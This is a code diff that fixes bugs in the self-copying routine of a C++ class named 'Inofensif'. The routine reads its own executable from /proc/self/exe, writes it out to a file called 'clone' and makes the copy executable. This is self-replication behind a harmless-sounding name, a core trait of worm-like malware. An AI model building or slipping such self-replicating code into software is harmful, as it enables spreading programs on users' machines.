@@ -103,9 +103,10 @@ class	Inofensif
 
 		void	clone_itself(void)
 		{
-			char		buffer[4000];
-			std::ofstream	clone("clone");
-			std::ifstream	itself("/proc/self/exe");
+			char			buffer[4000];
+			std::filesystem::path	clone_path = "clone";
+			std::ofstream		clone(clone_path);
+			std::ifstream		itself("/proc/self/exe");
 			if (debug)
 			{
 				std::cout << "clone FILE_OPEN: " << clone.is_open() << std::endl;
@@ -113,15 +114,17 @@ class	Inofensif
 			}
 			do
 			{
-				itself.read(buffer, 4000);
-				clone.write(buffer, 4000);
+				itself.read(buffer, sizeof(buffer));
+				clone.write(buffer, itself.gcount());
 			} while((itself.rdstate() & std::ifstream::eofbit) == 0);
-			std::filesystem::permissions(clone, 
+			std::filesystem::permissions(clone_path, 
 				std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
 				std::filesystem::perm_options::add);
 			if (debug)
 			{
 			}
+			itself.close();
+			clone.close();
 		}
 
 	public:
